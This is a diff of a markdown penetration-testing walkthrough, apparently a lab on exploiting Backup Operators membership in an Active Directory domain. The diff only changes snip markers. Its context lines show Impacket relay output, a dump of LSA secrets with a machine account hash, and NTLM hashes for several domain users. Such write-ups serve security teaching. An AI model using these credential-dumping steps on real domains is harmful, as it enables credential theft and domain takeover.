@@ -40,7 +40,7 @@ The request will be processed at a domain controller for domain offsec.nl.
 
 User name                    johndo
 Full Name                    John Do
-[...SNIP...]
+[...]
 
 Local Group Memberships      *Backup Operators
 Global Group memberships     *Domain Users
@@ -64,7 +64,7 @@ Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corpo
 [*] Incoming connection (10.20.30.12,50555)
 [*] AUTHENTICATE_MESSAGE (OFFSEC\johndo,WIN10)
 [*] User WIN10\johndo authenticated successfully
-[...SNIP...]
+[...]
 ```
 
 ## Exploiting the vulnerable configuration
@@ -96,9 +96,9 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [*] Dumping cached domain logon information (domain/username:hash)
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC 
-$MACHINE.ACC:plain_password_hex:43bcb[...SNIP...]
+$MACHINE.ACC:plain_password_hex:43bcb[...]
 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e1842947e54ab3d9a8758531e8fc6049
-[...SNIP...]
+[...]
 ```
 
 ### Dump everything
@@ -120,7 +120,7 @@ offsec.nl\WARD_CONTRERAS:1105:aad3b435b51404eeaad3b435b51404ee:e0e7955fe13737060
 offsec.nl\EDDY_MILES:1106:aad3b435b51404eeaad3b435b51404ee:f41a8d181561d36de8ebfc96a0caac0f:::
 offsec.nl\ANDREW_VASQUEZ:1107:aad3b435b51404eeaad3b435b51404ee:bc13660676fce9b4aab8fac6ed8adcd5:::
 offsec.nl\ULYSSES_COTE:1108:aad3b435b51404eeaad3b435b51404ee:c7f0cab839fde136be09348e15febaba:::
-[...SNIP...]
+[...]
 ```
 
 #### Using machine account hash
@@ -140,7 +140,7 @@ offsec.nl\WARD_CONTRERAS:1105:aad3b435b51404eeaad3b435b51404ee:e0e7955fe13737060
 offsec.nl\EDDY_MILES:1106:aad3b435b51404eeaad3b435b51404ee:f41a8d181561d36de8ebfc96a0caac0f:::
 offsec.nl\ANDREW_VASQUEZ:1107:aad3b435b51404eeaad3b435b51404ee:bc13660676fce9b4aab8fac6ed8adcd5:::
 offsec.nl\ULYSSES_COTE:1108:aad3b435b51404eeaad3b435b51404ee:c7f0cab839fde136be09348e15febaba:::
-[...SNIP...]
+[...]
 ```
 
 ### URL list
